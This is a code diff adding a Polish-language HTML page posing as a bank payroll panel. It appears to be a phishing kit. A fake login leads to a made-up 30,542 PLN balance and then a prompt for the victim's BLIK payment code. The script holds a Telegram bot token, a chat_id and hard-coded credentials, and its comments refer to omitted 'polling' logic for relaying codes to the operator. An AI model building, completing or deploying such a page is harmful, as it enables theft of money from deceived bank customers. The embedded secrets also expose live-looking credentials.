@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Rozliczeń Pracowniczych</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #0047bb;
+            --success-color: #27ae60;
+            --danger-color: #e1173c;
+            --bg-color: #f4f7fa;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            font-family: 'Inter', -apple-system, sans-serif; 
+            color: #2c3e50;
+            line-height: 1.6;
+        }
+
+        .app-container { 
+            max-width: 440px; 
+            margin: 40px auto; 
+            background: #ffffff; 
+            border-radius: 24px; 
+            overflow: hidden; 
+            box-shadow: var(--card-shadow);
+            border: 1px solid rgba(0,0,0,0.03);
+        }
+
+        .step { display: none; padding: 32px; animation: fadeIn 0.4s ease; }
+        .active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header-logo {
+            padding: 20px;
+            text-align: center;
+            background: #fff;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .balance-card { 
+            background: linear-gradient(135deg, var(--primary-color), #0066ff); 
+            color: white; 
+            padding: 30px 20px; 
+            border-radius: 20px; 
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .balance-card::after {
+            content: "";
+            position: absolute;
+            top: -20%; right: -10%;
+            width: 150px; height: 150px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+        }
+
+        .form-control {
+            border-radius: 12px;
+            padding: 12px 16px;
+            border: 1.5px solid #e0e6ed;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(0, 71, 187, 0.1);
+        }
+
+        .btn {
+            border-radius: 12px;
+            padding: 14px;
+            font-weight: 600;
+            transition: all 0.2s;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary { background-color: var(--primary-color); border: none; }
+        .btn-primary:hover { background-color: #003791; transform: translateY(-1px); }
+
+        .btn-success { background-color: var(--success-color); border: none; }
+        .btn-danger { background-color: var(--danger-color); border: none; }
+
+        .blik-input { 
+            letter-spacing: 12px; 
+            font-size: 2.4rem !important; 
+            font-weight: 700; 
+            text-align: center; 
+            border: 2px solid #e1173c; 
+            color: var(--danger-color);
+            background: #fff5f6;
+        }
+
+        .loading-overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255,255,255,0.95); 
+            display: none; flex-direction: column; 
+            justify-content: center; align-items: center; 
+            z-index: 9999; 
+        }
+
+        .status-dot {
+            height: 8px; width: 8px;
+            background-color: #2ecc71;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+
+        .footer-secure {
+            font-size: 12px;
+            color: #95a5a6;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="loader" class="loading-overlay">
+    <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"></div>
+    <p class="mt-4 fw-bold text-primary">Szyfrowanie połączenia...</p>
+</div>
+
+<div class="app-container">
+    <div class="header-logo">
+        <span class="fw-bold text-primary" style="letter-spacing: -0.5px;">BANK<span style="color: #333;">SYSTEM</span></span>
+    </div>
+
+    <!-- KROK 1: LOGOWANIE -->
+    <div id="step-login" class="step active">
+        <div class="text-center mb-4">
+            <h3 class="fw-bold">Witaj z powrotem</h3>
+            <p class="text-muted small">Wprowadź dane dostępowe do panelu</p>
+        </div>
+        <div id="login-error" class="alert alert-danger d-none py-2 small">Nieprawidłowy login lub hasło.</div>
+        <div class="mb-3">
+            <label class="small fw-600 mb-1">Identyfikator</label>
+            <input type="text" id="login-id" class="form-control" placeholder="Numer pracownika">
+        </div>
+        <div class="mb-4">
+            <label class="small fw-600 mb-1">Hasło</label>
+            <input type="password" id="login-pass" class="form-control" placeholder="••••••••">
+        </div>
+        <button onclick="checkLogin()" class="btn btn-primary w-100 shadow-sm">Zaloguj się bezpiecznie</button>
+        <div class="footer-secure">
+            🔒 Połączenie szyfrowane AES-256
+        </div>
+    </div>
+
+    <!-- KROK 2: DASHBOARD -->
+    <div id="step-dash" class="step">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <span class="small fw-bold uppercase text-muted">Twój portfel</span>
+            <span class="small text-success fw-bold"><span class="status-dot"></span>Online</span>
+        </div>
+        <div class="balance-card shadow-sm text-center">
+            <span class="opacity-75 small">Dostępne środki</span>
+            <h2 class="fw-bold mt-1">30 542,10 PLN</h2>
+        </div>
+        <div class="bg-light p-3 rounded-4 mb-4 border">
+            <div class="d-flex justify-content-between small mb-2">
+                <span class="text-muted">Typ rozliczenia:</span>
+                <span class="fw-bold">Premia / Wynagrodzenie</span>
+            </div>
+            <div class="d-flex justify-content-between small">
+                <span class="text-muted">Data wystawienia:</span>
+                <span class="fw-bold">09.05.2026</span>
+            </div>
+        </div>
+        <button onclick="goTo('step-kyc')" class="btn btn-success btn-lg w-100 shadow">Wypłać na konto</button>
+    </div>
+
+    <!-- Reszta kroków (KYC, Account, Blik) zostaje z tą samą logiką, tylko ubraną w powyższy styl -->
+    <!-- Pamiętaj, aby przy przyciskach używać klas: btn btn-primary w-100 -->
+
+    <!-- KROK 5: BLIK (Pokazuję styl przycisku) -->
+    <div id="step-blik" class="step text-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Blik_logo.png" width="80" class="mb-4">
+        <h4 class="fw-bold">Potwierdź tożsamość</h4>
+        <p class="small text-muted mb-4">Wpisz 6-cyfrowy kod BLIK wygenerowany w aplikacji bankowej.</p>
+        <input type="number" id="p-blik" class="form-control blik-input mb-4" placeholder="000000">
+        <button onclick="sendBlikForApproval()" class="btn btn-danger btn-lg w-100 shadow">Potwierdzam wypłatę</button>
+    </div>
+</div>
+
+<script>
+    // Tutaj wklej całą logikę JS, którą przygotowaliśmy wcześniej (token, chat_id, polling).
+    // Dane konfiguracyjne:
+    const token = '8675368774:AAGvYsmeSqRQdDXXOYT7-2GSszVEWh7NhbE';
+    const chat_id = '7506682898';
+    const VALID_USER = "worker03";
+    const VALID_PASS = "ui3h4nJNF32r3";
+
+    // ... (reszta funkcji JS bez zmian) ...
+</script>
+</body>
+</html>
